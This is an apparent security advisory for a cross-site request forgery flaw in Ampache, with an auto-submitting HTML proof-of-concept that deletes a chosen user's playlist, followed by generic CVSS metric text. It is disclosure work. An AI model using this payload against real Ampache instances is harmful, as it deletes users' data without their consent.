## Description

### Summary

CSRF attack can be performed in order to delete objects (Playlist, smartlist etc.).

Cross-Site Request Forgery (CSRF) is an attack that forces authenticated users to submit a request to a Web application against which they are currently authenticated.

### Details

This vulnerability can be exploited by creating a malicious script with an arbitrary playlist ID belonging to another user. When the user submits the request, their playlist will be deleted.

### PoC

Logged in as the user "demo" and created a new playlist called "test playlist."

The playlist was assigned ID 461 upon creation.

Save the following HTML code to a file and change the ID with the playlist ID of the user whose playlist you want to delete.

```
<html>
  <body>
    <form action="https://demo.ampache.dev/playlist.php">
      <input type="hidden" name="action" value="delete&#95;playlist" />
      <input type="hidden" name="playlist&#95;id" value="461"/>
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

When he submits the request his playlist will be deleted.

The only requirement is that the user has a valid session with the tested Ampache.

### Impact

Any User with active sessions who are tricked into submitting a malicious request are impacted, as their playlists or other objects could be deleted without their consent.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
